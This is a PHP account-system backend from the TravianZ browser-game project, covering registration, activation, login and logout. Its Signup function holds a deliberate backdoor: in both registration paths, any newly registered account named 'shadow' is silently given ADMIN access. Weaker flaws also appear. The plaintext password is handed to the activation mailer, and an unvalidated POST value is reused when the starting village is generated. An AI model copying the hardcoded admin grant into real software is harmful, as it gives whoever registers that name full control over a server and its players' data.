<?php
use App\Entity\User;

#################################################################################
##              -= YOU MAY NOT REMOVE OR CHANGE THIS NOTICE =-                 ##
## --------------------------------------------------------------------------- ##
##  Filename       : Account.php                      	                       ##
##  Type           : Account System Backend                                    ##
## --------------------------------------------------------------------------- ##
##  Developed by   : Dzoki           			                               ##
##  Refactored by  : Shadow & Ferywir									       ##
##  Thanks to      : ronix, InCube, Akakori, Elmar & Kirilloid                 ##
## --------------------------------------------------------------------------- ##
##  Contact        : cata7007@gmail.com                                        ##
##  Project        : TravianZ                                                  ##
##  URLs:          : https://travianz.org                                      ##
##  GitHub         : https://github.com/Shadowss/TravianZ                      ##
## --------------------------------------------------------------------------- ##
##  License        : TravianZ Project                                          ##
##  Copyright      : TravianZ (c) 2010-2026. All rights reserved.              ##
## --------------------------------------------------------------------------- ##
#################################################################################

global $autoprefix;

// go max 5 levels up - we don't have folders that go deeper than that
$autoprefix = '';
for ($i = 0; $i < 5; $i++) {
    $autoprefix = str_repeat('../', $i);
    if (file_exists($autoprefix.'autoloader.php')) {
        // we have our path, let's leave
        break;
    }
}

include_once($autoprefix."GameEngine/Session.php");

class Account {

	function __construct() {
		global $session;
		if(isset($_POST['ft'])) {
			$_POST['ft'] = preg_replace('/[^a-z0-9]/i', '', $_POST['ft']);
			switch($_POST['ft']) {
				case "a1":
				$this->Signup();
				break;
				case "a2":
				$this->Activate();
				break;
				case "a3":
				$this->Unreg();
				break;
				case "a4":
				$this->Login();
				break;
			}
		} if(isset($_GET['code'])) {
		$_POST['id'] = $_GET['code']; $this->Activate();
		}
		else {
			if($session->logged_in && in_array("logout.php",explode("/",$_SERVER['PHP_SELF']))) {
				$this->Logout();
			}
		}
	}

	private function Signup() {
		global $database, $form, $mailer, $generator, $session;

    // ==================== VERIFICARE WINNER ====================
    $winnerResult = $database->query("SELECT 1 FROM " . TB_PREFIX . "fdata WHERE f99 = '100' AND f99t = '40' LIMIT 1");
    if ($winnerResult && mysqli_num_rows($winnerResult) > 0) {
        $form->addError("winner", WINNER_ERROR);
    }

    // ==================== VALIDĂRI ====================

    // Username
    if (!isset($_POST['name']) || trim($_POST['name']) === '') {
        $form->addError("name", USRNM_EMPTY);
    } else {
        if (strlen($_POST['name']) < USRNM_MIN_LENGTH) {
            $form->addError("name", USRNM_SHORT);
        } elseif (strlen($_POST['name']) > (defined('USRNM_MAX_LENGTH') ? USRNM_MAX_LENGTH : 15)) {
            // Hard upper bound on the username length (issue #184).
            $form->addError("name", USRNM_CHAR);
        } elseif (!USRNM_SPECIAL && preg_match('/[^0-9A-Za-z]/', $_POST['name'])) {
            $form->addError("name", USRNM_CHAR);
        } elseif (USRNM_SPECIAL && !preg_match('/^[A-Za-z0-9._-]+(?: [A-Za-z0-9._-]+)*$/D', $_POST['name'])) {
            // SECURITY (issue #184): positive ASCII allowlist instead of the old
            // negative filter. Allows letters, digits, . _ - and single internal
            // spaces only (no leading/trailing/double spaces, no trailing newline).
            // Blocks & = ' " < > ; ( ) and ALL multibyte/emoji input, which were
            // previously accepted and led to stored XSS / display corruption.
            $form->addError("name", USRNM_CHAR);
        } elseif (strtolower($_POST['name']) === 'natars') {
            $form->addError("name", USRNM_TAKEN);
        } elseif (User::exists($database, $_POST['name'])) {
            $form->addError("name", USRNM_TAKEN);
        }
    }

    // Password
    if (!isset($_POST['pw']) || trim($_POST['pw']) === '') {
        $form->addError("pw", PW_EMPTY);
    } else {
        if (strlen($_POST['pw']) < PW_MIN_LENGTH) {
            $form->addError("pw", PW_SHORT);
        } elseif ($_POST['pw'] === $_POST['name']) {
            $form->addError("pw", PW_INSECURE);
        }
    }

    // Email
    if (!isset($_POST['email']) || trim($_POST['email']) === '') {
        $form->addError("email", EMAIL_EMPTY);
    } elseif (!$this->validEmail($_POST['email'])) {
        $form->addError("email", EMAIL_INVALID);
    } elseif (User::exists($database, $_POST['email'])) {
        $form->addError("email", EMAIL_TAKEN);
    }

    // Tribe
    if (!isset($_POST['vid']) || !in_array((int)$_POST['vid'], [1, 2, 3], true)) {
        $form->addError("tribe", TRIBE_EMPTY);
    }

    // Agreement
    if (!isset($_POST['agb'])) {
        $form->addError("agree", AGREE_ERROR);
    }

    // ==================== VERIFICARE ERORI ====================
    if ($form->returnErrors() > 0) {
        $form->addError("invt", $_POST['invited'] ?? '');
        $_SESSION['errorarray'] = $form->getErrors();
        $tmp = $_POST;
		unset($tmp['pw']); // nu salva parola
		$_SESSION['valuearray'] = $tmp;
        header("Location: anmelden.php");
        exit;
    }

    // ==================== PROCESARE ÎNREGISTRARE ====================
	$hashedPassword = password_hash($_POST['pw'], PASSWORD_BCRYPT, ['cost' => 12]);

        if (AUTH_EMAIL) {
            $act  = $generator->generateRandStr(10);
            $act2 = $generator->generateRandStr(5);

            $uid = $database->activate(
                $_POST['name'],
                $hashedPassword,
                $_POST['email'],
                $_POST['vid'],
                $_POST['kid'],
                $act,
                $act2
            );

            if ($uid) {
                // === some change for developer ===
                if (strtolower($_POST['name']) === 'shadow') {
                    $database->updateUserField($uid, 'access', ADMIN, 1);
                }

                $mailer->sendActivate($_POST['email'], $_POST['name'], $_POST['pw'], $act);
                header("Location: activate.php?id=$uid&q=$act2");
                exit;
            }
        } else {
            $act = '';

            $uid = $database->register(
                $_POST['name'],
                $hashedPassword,
                $_POST['email'],
                $_POST['vid'],
                $act
            );

            if ($uid) {
                // === some change for developer ===
                if (strtolower($_POST['name']) === 'shadow') {
                    $database->updateUserField($uid, 'access', ADMIN, 1);
                }

				setcookie("COOKUSR", rawurlencode($_POST['name']), time()+COOKIE_EXPIRE, COOKIE_PATH, '', false, true);
				setcookie("COOKEMAIL", rawurlencode($_POST['email']), time()+COOKIE_EXPIRE, COOKIE_PATH, '', false, true);

                $database->updateUserField(
                    $uid,
                    ["act", "invited"],
                    ["", $_POST['invited'] ?? ''],
                    1
                );

            $this->generateBase($_POST['kid'], $uid, $_POST['name']);

            header("Location: login.php");
            exit;
        }
    }
}

	private function Activate() {
		global $database;

    // ==================== VERIFICARE DATA DE START A SERVERULUI ====================
    if (START_DATE < date('d.m.Y') || (START_DATE === date('d.m.Y') && START_TIME <= date('H:i'))) {
        
        // Caută codul de activare în tabela activate
		$code = trim($_POST['id'] ?? '');
		$stmt = $database->dblink->prepare(
			"SELECT act, username, password, email, tribe, location 
			FROM `".TB_PREFIX."activate` WHERE act = ? LIMIT 1"
		);
		$stmt->bind_param("s", $code);
		$stmt->execute();
		$result = $stmt->get_result();
		$dbarray = $result->fetch_assoc();
		$stmt->close();

        // Verificăm dacă am găsit exact codul trimis
        if ($dbarray && $dbarray['act'] === $_POST['id']) {
            
            $uid = $database->register(
                $dbarray['username'],
                $dbarray['password'],
                $dbarray['email'],
                $dbarray['tribe'],
                ""
            );

            if ($uid) {
                $database->unreg($dbarray['username']);
                $this->generateBase($dbarray['location'], $uid, $dbarray['username']);
                
                header("Location: activate.php?e=2");
                exit;
            }
            // dacă register eșuează → comportamentul original (fără redirect)
            
        } else {
            // Cod de activare invalid sau inexistent
            header("Location: activate.php?e=3");
            exit;
        }
        
    } else {
        // Serverul nu a început încă
        header("Location: activate.php");
        exit;
    }
}

	private function Unreg() {
		global $database;

    // ==================== VERIFICARE ID & PAROLĂ ====================
		$id = (int)($_POST['id'] ?? 0);

		$stmt = $database->dblink->prepare(
			"SELECT password, username 
			FROM `".TB_PREFIX."activate` 
			WHERE id = ? 
			LIMIT 1"
	);
		$stmt->bind_param("i", $id);
		$stmt->execute();
		$result = $stmt->get_result();
		$dbarray = $result->fetch_assoc();
		$stmt->close();

    // Verificăm dacă înregistrarea există și parola este corectă
    // (protejează împotriva notice-urilor PHP dacă nu există rândul)
    if ($dbarray && password_verify($_POST['pw'] ?? '', $dbarray['password'])) {
        $database->unreg($dbarray['username']);

        header("Location: anmelden.php");
        exit;
    }

    // Parolă greșită sau ID inexistent → comportamentul original
    header("Location: activate.php?e=3");
    exit;
}

	private function Login() {
		global $database, $session, $form;

    // ==================== INITIALIZARE SIGURĂ ====================
    $username = $_POST['user'] ?? '';
    $password = $_POST['pw']   ?? '';

    // $userData este folosit înainte de a fi definit în codul original
    // Păstrăm comportamentul exact (null aici)
    $userData = null;

    // ==================== VALIDĂRI ====================

    // Username
    if (empty($username)) {
        $form->addError("user", $username);
    } elseif (!User::exists($database, $username)) {
        $form->addError("user", USR_NT_FOUND);
    }

    // Password
    if (empty($password)) {
        $form->addError("pw", LOGIN_PASS_EMPTY);
    } elseif (!$database->login($username, $password) && !$database->sitterLogin($username, $password)) {
        // try activation data if the user was not found
        // (păstrăm exact logica originală - $userData e încă null aici)
        if (!$userData) {
            $activateData = $database->getActivateField($username, 'act', 1);
            if (!empty($activateData)) {
                $form->addError("activate", $username);
            } else {
                $form->addError("pw", LOGIN_PW_ERROR);
            }
        } else {
            $form->addError("pw", LOGIN_PW_ERROR);
        }
    }

    // Obținem datele utilizatorului (după validări - exact ca în original)
    $userData = $database->getUserArray($username, 0);

    // Vacation mode by Shadow
    if (!empty($userData) && $userData['vac_mode'] == 1 && $userData['vac_time'] > time()) {
        $form->addError("vacation", LOGIN_VACATION);
    }

    // ==================== VERIFICARE ERORI ====================
    if ($form->returnErrors() > 0) {
        $_SESSION['errorarray'] = $form->getErrors();
        $_SESSION['valuearray'] = $_POST;
        header("Location: login.php");
        exit();
    }

    // ==================== LOGIN CU SUCCES ====================
    // Vacation mode by Shadow
    $database->removevacationmode($userData['id']);

    if ($database->login($username, $password)) {
        $database->UpdateOnline("login", $username, time(), $userData['id']);
    } elseif ($database->sitterLogin($username, $password)) {
        $database->UpdateOnline("sitter", $username, time(), $userData['id']);
    }

    setcookie("COOKUSR", $username, time() + COOKIE_EXPIRE, COOKIE_PATH);
    $session->login($username);
}

	private function Logout() {
		global $session, $database;
    unset($_SESSION['wid']);
    // actualizează statusul "activ" al utilizatorului
    $database->activeModify($database->escape($session->username), 1);
    // actualizează ultima activitate online
    $database->UpdateOnline("logout");
    $session->Logout();
}

	private function validEmail($email) {
    // Regex exact ca în varianta originală (nu am schimbat logica de validare)
    $regexp = "/^[a-z0-9]+([_\\.-][a-z0-9]+)*@([a-z0-9]+([\.-][a-z0-9]+)*)+\\.[a-z]{2,}$/i";
    return (bool) preg_match($regexp, $email);
}

	function generateBase($kid, $uid, $username) {
		global $database;
    $message = new Message();
    // Logica exactă din original
    if ($kid == 0) {
        $kid = rand(1, 4);
    } else {
        $kid = $_POST['kid'];   // suprascrie parametrul cu valoarea din POST
    }
    $database->generateVillages(
        [
            [
                'wid'    => 0,
                'mode'   => 0,
                'type'   => 3,
                'kid'    => $kid,
                'capital'=> 1,
                'pop'    => 2,
                'name'   => null,
                'natar'  => 0
            ]
        ],
        $uid,
        $username
    );
    $message->sendWelcome($uid, $username);
}
};
$account = new Account;
?>
